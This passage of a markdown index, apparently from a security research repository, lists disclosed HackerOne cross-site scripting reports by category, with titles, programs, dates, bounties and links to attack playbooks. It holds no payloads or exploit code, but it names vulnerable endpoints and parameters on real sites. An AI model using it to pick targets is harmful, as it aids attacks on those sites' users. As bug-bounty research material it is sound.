| Case ID | Original report title | Program | Published | Severity | Bounty | Weakness (H1) | Affected asset | Evidence | Playbook |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| FILT-001 | [Stored XSS on this link https://sehacure.slack.com/help/requests/](https://hackerone.com/reports/2639) | Slack | 2014-03-01T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-002 | [Reflected Xss](https://hackerone.com/reports/2777) | Slack | 2014-03-03T00:00:00 | Not disclosed in the source | $500 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-003 | [Here is another XSS i got for you](https://hackerone.com/reports/4276) | MoneyStream | 2014-03-18T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-004 | [XSS 1](https://hackerone.com/reports/9230) | StopTheHacker | 2014-04-22T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-005 | [Reflected cross site scripting in login page](https://hackerone.com/reports/9735) | StopTheHacker | 2014-04-25T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-006 | [Stored Cross-Site Scripting Vulnerability in /admin.php?/cp/admin_system/general_configuration](https://hackerone.com/reports/26482) | ExpressionEngine | 2014-08-30T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-007 | [Reflected XSS on www.bookfresh.com/index.html?view=upload_form](https://hackerone.com/reports/31187) | Bookfresh | 2014-10-13T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-008 | [APIs for channels allow HTML entities that may cause XSS issue](https://hackerone.com/reports/42702) | Vimeo | 2015-01-06T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-009 | [player.vimeo.com - Reflected XSS Vulnerability](https://hackerone.com/reports/43672) | Vimeo | 2015-01-14T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-010 | [Application XSS filter function Bypass may allow Multiple stored XSS](https://hackerone.com/reports/44217) | Vimeo | 2015-01-18T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-011 | [Vimeo Search - XSS Vulnerability [http://vimeo.com/search]](https://hackerone.com/reports/44798) | Vimeo | 2015-01-22T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-012 | [Multiple Reflected Cross Site Scripting Vulnerabilities in Concrete5 version 5.7.3.1](https://hackerone.com/reports/59661) | concrete5 | 2015-05-05T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-013 | [Multiple Stored Cross Site Scripting Vulnerabilities in Concrete5 version 5.7.3.1](https://hackerone.com/reports/59662) | concrete5 | 2015-05-05T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-014 | [XSS on https://www.udemy.com/asset/export.html](https://hackerone.com/reports/62400) | Udemy | 2015-05-14T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-015 | [apps.owncloud.com: XSS via referrer](https://hackerone.com/reports/83374) | ownCloud | 2015-08-19T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-016 | [XSS on vimeo.com | "Search within these results" feature (requires user interaction)](https://hackerone.com/reports/88105) | Vimeo | 2015-09-09T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-017 | [Reflective XSS on wholesale.shopify.com](https://hackerone.com/reports/106293) | Shopify | 2015-12-21T00:00:00 | Not disclosed in the source | $500 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-018 | [Stored XSS in /admin/orders](https://hackerone.com/reports/106897) | Shopify | 2015-12-25T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-019 | [XSS via modified Zomato widget (res_search_widget.php)](https://hackerone.com/reports/115402) | Zomato | 2016-02-08T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-020 | [Stored XSS in drive.uber.com WordPress admin panel](https://hackerone.com/reports/126099) | Uber | 2016-03-26T00:00:00 | Not disclosed in the source | $2,000 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-021 | [XSS on https://app.shopify.com/](https://hackerone.com/reports/126539) | Shopify | 2016-03-28T00:00:00 | Not disclosed in the source | $500 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-022 | [XSS in https://www.coursera.org/courses/](https://hackerone.com/reports/127163) | Coursera | 2016-03-31T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-023 | [Reflected XSS in scores.ubnt.com](https://hackerone.com/reports/130889) | Ubiquiti Networks | 2016-04-14T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-024 | [doc.owncloud.org: XSS via Referrer](https://hackerone.com/reports/130951) | ownCloud | 2016-04-15T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-025 | [Stored XSS in developer.uber.com](https://hackerone.com/reports/131450) | Uber | 2016-04-16T00:00:00 | Not disclosed in the source | $7,500 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-026 | [WordPress core stored XSS via attachment file name](https://hackerone.com/reports/139245) | Automattic | 2016-05-17T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-027 | [XSS в upload.php](https://hackerone.com/reports/142135) | VK.com | 2016-05-30T00:00:00 | Not disclosed in the source | $1,500 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-028 | [[uk.informatica.com] XSS on uk.informatica..com](https://hackerone.com/reports/143323) | Informatica | 2016-06-06T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-029 | [Content-type sniffing leads to stored XSS in CMS Airship on Internet Explorer](https://hackerone.com/reports/151231) | Paragon Initiative Enterprises | 2016-07-13T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-030 | [Stored XSS on developer.uber.com via admin account compromise](https://hackerone.com/reports/152067) | Uber | 2016-07-18T00:00:00 | Not disclosed in the source | $5,000 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-031 | [Reflected xss on websummit.net](https://hackerone.com/reports/166699) | WebSummit | 2016-09-07T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-032 | [DOM based XSS in search functionality](https://hackerone.com/reports/168165) | SecNews | 2016-09-13T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-033 | [Cross-site scripting (reflected)](https://hackerone.com/reports/176754) | Twitter | 2016-10-19T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-034 | [[marketplace.informatica.com] Persistent XSS through document title](https://hackerone.com/reports/181816) | Informatica | 2016-11-12T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-035 | [Stored XSS at 'Buy Button' page](https://hackerone.com/reports/186462) | Shopify | 2016-11-29T00:00:00 | Not disclosed in the source | $500 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-036 | [[kb.informatica.com] DOM based XSS in the bindBreadCrumb function](https://hackerone.com/reports/189834) | Informatica | 2016-12-09T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-037 | [[marketplace.informatica.com] Search XSS](https://hackerone.com/reports/200034) | Informatica | 2017-01-20T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |
| FILT-038 | [MailPoet Newsletters <= 2.7.2 - Authenticated Reflected Cross-Site Scripting (XSS)](https://hackerone.com/reports/200355) | Zomato | 2017-01-22T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Filter-Bypass-and-Encoding.md](../../Filter-Bypass-and-Encoding.md) |

<details><summary>Retrieval limitations for this group</summary>

- Every source in this group was retrieved with its full report body.

</details>

#### Self-XSS → [`Self-XSS.md`](../../Self-XSS.md)

24 sources. Weakness field as published by HackerOne:

- Cross-site Scripting (XSS) - Generic: 24

| Case ID | Original report title | Program | Published | Severity | Bounty | Weakness (H1) | Affected asset | Evidence | Playbook |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| SELF-001 | [http://jetpack.me/ Self XSS](https://hackerone.com/reports/14303) | Automattic | 2014-05-31T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Self-XSS.md](../../Self-XSS.md) |
| SELF-002 | [Self Xss on File Replace](https://hackerone.com/reports/50481) | concrete5 | 2015-03-07T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Self-XSS.md](../../Self-XSS.md) |
| SELF-003 | [Self XSS Protection not used , I can trick users to insert JavaScript](https://hackerone.com/reports/76307) | Gratipay | 2015-07-17T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Self-XSS.md](../../Self-XSS.md) |
| SELF-004 | [Self XSS in chat.](https://hackerone.com/reports/81757) | Shopify | 2015-08-11T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Self-XSS.md](../../Self-XSS.md) |
| SELF-005 | [Self-XSS in posts by formatting text as code](https://hackerone.com/reports/89505) | Slack | 2015-09-18T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Self-XSS.md](../../Self-XSS.md) |
| SELF-006 | [Reflected Self-XSS in Slack](https://hackerone.com/reports/97683) | Slack | 2015-11-04T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Self-XSS.md](../../Self-XSS.md) |
| SELF-007 | [xss in link items (mopub.com)](https://hackerone.com/reports/100931) | Twitter | 2015-11-22T00:00:00 | Not disclosed in the source | $560 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Self-XSS.md](../../Self-XSS.md) |
| SELF-008 | [Self-XSS Vulnerability on Password Reset Form](https://hackerone.com/reports/125059) | Uber | 2016-03-22T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Self-XSS.md](../../Self-XSS.md) |
| SELF-009 | [Stored self-XSS at m.uber.com](https://hackerone.com/reports/134124) | Uber | 2016-04-23T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Self-XSS.md](../../Self-XSS.md) |
| SELF-010 | [Self-XSS on partners.uber.com](https://hackerone.com/reports/138622) | Uber | 2016-05-13T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Self-XSS.md](../../Self-XSS.md) |
| SELF-011 | [Self-XSS in Partners Profile](https://hackerone.com/reports/145289) | Uber | 2016-06-17T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Self-XSS.md](../../Self-XSS.md) |
| SELF-012 | [Multiple XSS in Camptix Event Ticketing Plugin](https://hackerone.com/reports/152958) | Ian Dunn | 2016-07-21T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Self-XSS.md](../../Self-XSS.md) |
| SELF-013 | [stored SELF xss on Basic Google Maps Placemarks Settings plugin](https://hackerone.com/reports/160488) | Ian Dunn | 2016-08-18T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Self-XSS.md](../../Self-XSS.md) |
| SELF-014 | [Reflected Self-XSS Vulnerability in the Comment section of Files Information](https://hackerone.com/reports/164027) | Nextcloud | 2016-08-28T00:00:00 | Not disclosed in the source | $100 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Self-XSS.md](../../Self-XSS.md) |
| SELF-015 | [Reflected Self-XSS Vulnerability in the Comment section of Files (Different-payloads)](https://hackerone.com/reports/164520) | Nextcloud | 2016-08-30T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Self-XSS.md](../../Self-XSS.md) |
| SELF-016 | [Self-XSS via location cookie city field when getting suggestions for a new location](https://hackerone.com/reports/166709) | Yelp | 2016-09-07T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Self-XSS.md](../../Self-XSS.md) |
| SELF-017 | [Reflected XSS in Step 2 of the Installation](https://hackerone.com/reports/170156) | Revive Adserver | 2016-09-18T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Self-XSS.md](../../Self-XSS.md) |
| SELF-018 | [(HackerOne SSO-SAML) Login CSRF, Open Redirect, and Self-XSS Possible Exploitation](https://hackerone.com/reports/171398) | HackerOne | 2016-09-23T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Self-XSS.md](../../Self-XSS.md) |
| SELF-019 | [Reflected XSS by exploiting CSRF vulnerability on teavana.com wishlist comment module. (wishlist-comments)](https://hackerone.com/reports/177508) | Starbucks | 2016-10-22T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Self-XSS.md](../../Self-XSS.md) |
| SELF-020 | [Reflected XSS on Zones > Invocation Code](https://hackerone.com/reports/178611) | Revive Adserver | 2016-10-28T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Self-XSS.md](../../Self-XSS.md) |
| SELF-021 | [IE 11 Self-XSS on Jira Integration Preview Base Link](https://hackerone.com/reports/212721) | HackerOne | 2017-03-12T00:00:00 | low | $750 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Self-XSS.md](../../Self-XSS.md) |
| SELF-022 | [Self XSS at translation page through Editor Link at demo.weblate.org](https://hackerone.com/reports/223692) | Weblate | 2017-04-25T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Self-XSS.md](../../Self-XSS.md) |
| SELF-023 | [self xss in](https://hackerone.com/reports/228539) | Quora | 2017-05-15T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Self-XSS.md](../../Self-XSS.md) |
| SELF-024 | [Self-XSS can be achieved in the editor link using filter bypass](https://hackerone.com/reports/229735) | Weblate | 2017-05-18T00:00:00 | none | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Self-XSS.md](../../Self-XSS.md) |

<details><summary>Retrieval limitations for this group</summary>

- Every source in this group was retrieved with its full report body.

</details>

#### DOM-Based-XSS → [`DOM-Based-XSS.md`](../../DOM-Based-XSS.md)

22 sources. Weakness field as published by HackerOne:

- Cross-site Scripting (XSS) - Generic: 15
- Cross-site Scripting (XSS) - DOM: 7

| Case ID | Original report title | Program | Published | Severity | Bounty | Weakness (H1) | Affected asset | Evidence | Playbook |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| DOM-001 | [Dom based XSS https://www.khanacademy.org/](https://hackerone.com/reports/6352) | Khan Academy | 2014-04-07T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [DOM-Based-XSS.md](../../DOM-Based-XSS.md) |
| DOM-002 | [genericons.com - DOM based XSS.](https://hackerone.com/reports/14305) | Automattic | 2014-05-31T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [DOM-Based-XSS.md](../../DOM-Based-XSS.md) |
| DOM-003 | [Pretty Photo Dom XSS](https://hackerone.com/reports/62385) | jsDelivr | 2015-05-14T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [DOM-Based-XSS.md](../../DOM-Based-XSS.md) |
| DOM-004 | [owncloud.com: DOM Based XSS](https://hackerone.com/reports/83178) | ownCloud | 2015-08-18T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [DOM-Based-XSS.md](../../DOM-Based-XSS.md) |
| DOM-005 | [DOM Based XSS in Checkout](https://hackerone.com/reports/105688) | LeaseWeb | 2015-12-17T00:00:00 | Not disclosed in the source | $100 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [DOM-Based-XSS.md](../../DOM-Based-XSS.md) |
| DOM-006 | [Dom Based Xss](https://hackerone.com/reports/125498) | Uber | 2016-03-23T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [DOM-Based-XSS.md](../../DOM-Based-XSS.md) |
| DOM-007 | [DOM XSS в /activation.php?act=activate_mobile](https://hackerone.com/reports/146939) | VK.com | 2016-06-24T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [DOM-Based-XSS.md](../../DOM-Based-XSS.md) |
| DOM-008 | [[scores.ubnt.com] DOM based XSS at form.html](https://hackerone.com/reports/158484) | Ubiquiti Networks | 2016-08-11T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [DOM-Based-XSS.md](../../DOM-Based-XSS.md) |
| DOM-009 | [Dom Based Xss DIV.innerHTML parameters store.starbucks*](https://hackerone.com/reports/188185) | Starbucks | 2016-12-04T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [DOM-Based-XSS.md](../../DOM-Based-XSS.md) |
| DOM-010 | [DOM Based XSS on an Army website](https://hackerone.com/reports/191407) | U.S. Dept Of Defense | 2016-12-15T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [DOM-Based-XSS.md](../../DOM-Based-XSS.md) |
| DOM-011 | [DOM Based XSS on a DoD website](https://hackerone.com/reports/191416) | U.S. Dept Of Defense | 2016-12-15T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [DOM-Based-XSS.md](../../DOM-Based-XSS.md) |
| DOM-012 | [DOM Based XSS in Discourse Search](https://hackerone.com/reports/191890) | Discourse | 2016-12-17T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [DOM-Based-XSS.md](../../DOM-Based-XSS.md) |
| DOM-013 | [dom xss in https://www.slackatwork.com](https://hackerone.com/reports/196624) | Slack | 2017-01-07T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [DOM-Based-XSS.md](../../DOM-Based-XSS.md) |
| DOM-014 | [DOM XSS on teavana.com via "pr_zip_location" parameter](https://hackerone.com/reports/209736) | Starbucks | 2017-03-01T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [DOM-Based-XSS.md](../../DOM-Based-XSS.md) |
| DOM-015 | [DOM XSS vulnerability in search dialogue (NC-SA-2017-007)](https://hackerone.com/reports/213227) | Nextcloud | 2017-03-13T00:00:00 | low | $250 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [DOM-Based-XSS.md](../../DOM-Based-XSS.md) |
| DOM-016 | [[GitHub Extension] Unsanitised HTML leading to XSS on GitHub.com](https://hackerone.com/reports/220494) | Algolia | 2017-04-12T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - DOM | Not disclosed in the source | Full report | [DOM-Based-XSS.md](../../DOM-Based-XSS.md) |
| DOM-017 | [DOM Based XSS In mercantile.wordpress.org](https://hackerone.com/reports/230435) | WordPress | 2017-05-21T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - DOM | Not disclosed in the source | Full report | [DOM-Based-XSS.md](../../DOM-Based-XSS.md) |
| DOM-018 | [XSS on any Shopify shop via abuse of the HTML5 structured clone algorithm in postMessage listener on "/:id/digital_wallets/dialog"](https://hackerone.com/reports/231053) | Shopify | 2017-05-23T00:00:00 | Not disclosed in the source | $3,000 | Cross-site Scripting (XSS) - DOM | Not disclosed in the source | Full report | [DOM-Based-XSS.md](../../DOM-Based-XSS.md) |
| DOM-019 | [xss found in zomato](https://hackerone.com/reports/240989) | Zomato | 2017-06-17T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - DOM | Not disclosed in the source | Full report | [DOM-Based-XSS.md](../../DOM-Based-XSS.md) |
| DOM-020 | [Dom based xss affecting all pages from https://www.grab.com/.](https://hackerone.com/reports/247246) | Grabtaxi Holdings Pte Ltd | 2017-07-08T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - DOM | Not disclosed in the source | Full report | [DOM-Based-XSS.md](../../DOM-Based-XSS.md) |
| DOM-021 | [[parcel.grab.com] DOM XSS at /assets/bower_components/lodash/perf/](https://hackerone.com/reports/248560) | Grabtaxi Holdings Pte Ltd | 2017-07-12T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - DOM | Not disclosed in the source | Full report | [DOM-Based-XSS.md](../../DOM-Based-XSS.md) |
| DOM-022 | [dom based xss in http://www.rockstargames.com/GTAOnline/ (Fix bypass)](https://hackerone.com/reports/261571) | Rockstar Games | 2017-08-19T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - DOM | www.rockstargames.com | Partial report (official disclosure summary only) | [DOM-Based-XSS.md](../../DOM-Based-XSS.md) |

<details><summary>Retrieval limitations for this group</summary>

- DOM-010 (https://hackerone.com/reports/191407): Partial report (official disclosure summary only).
- DOM-011 (https://hackerone.com/reports/191416): Partial report (official disclosure summary only).
- DOM-015 (https://hackerone.com/reports/213227): Partial report (official disclosure summary only).
- DOM-022 (https://hackerone.com/reports/261571): Partial report (official disclosure summary only).

</details>

#### File-Upload-and-SVG-XSS → [`File-Upload-and-SVG-XSS.md`](../../File-Upload-and-SVG-XSS.md)

18 sources. Weakness field as published by HackerOne:

- Cross-site Scripting (XSS) - Generic: 18

| Case ID | Original report title | Program | Published | Severity | Bounty | Weakness (H1) | Affected asset | Evidence | Playbook |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| FILE-001 | [https://polldaddy.com storage.swf XSS](https://hackerone.com/reports/9522) | Automattic | 2014-04-24T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [File-Upload-and-SVG-XSS.md](../../File-Upload-and-SVG-XSS.md) |
| FILE-002 | [Flash XSS on swfupload.swf showing at app.mavenlink.com](https://hackerone.com/reports/21150) | Mavenlink | 2014-07-23T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [File-Upload-and-SVG-XSS.md](../../File-Upload-and-SVG-XSS.md) |
| FILE-003 | [XSS on any site that includes the moogaloop flash player | deprecated embed code](https://hackerone.com/reports/44512) | Vimeo | 2015-01-21T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [File-Upload-and-SVG-XSS.md](../../File-Upload-and-SVG-XSS.md) |
| FILE-004 | [XSS at http://vk.com on IE using flash files](https://hackerone.com/reports/66121) | VK.com | 2015-06-05T00:00:00 | Not disclosed in the source | $500 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [File-Upload-and-SVG-XSS.md](../../File-Upload-and-SVG-XSS.md) |
| FILE-005 | [XSS when using captions/subtitles on video player based on Flash (requires user interaction)](https://hackerone.com/reports/88508) | Vimeo | 2015-09-11T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [File-Upload-and-SVG-XSS.md](../../File-Upload-and-SVG-XSS.md) |
| FILE-006 | [Reflected Flash XSS using swfupload.swf with an epileptic reloading to bypass the button-event](https://hackerone.com/reports/91421) | Imgur | 2015-10-01T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [File-Upload-and-SVG-XSS.md](../../File-Upload-and-SVG-XSS.md) |
| FILE-007 | [Executing scripts on slack-files.com using SVG](https://hackerone.com/reports/100565) | Slack | 2015-11-19T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [File-Upload-and-SVG-XSS.md](../../File-Upload-and-SVG-XSS.md) |
| FILE-008 | [Stored XSS thru SVG upload](https://hackerone.com/reports/130591) | Moneybird | 2016-04-14T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [File-Upload-and-SVG-XSS.md](../../File-Upload-and-SVG-XSS.md) |
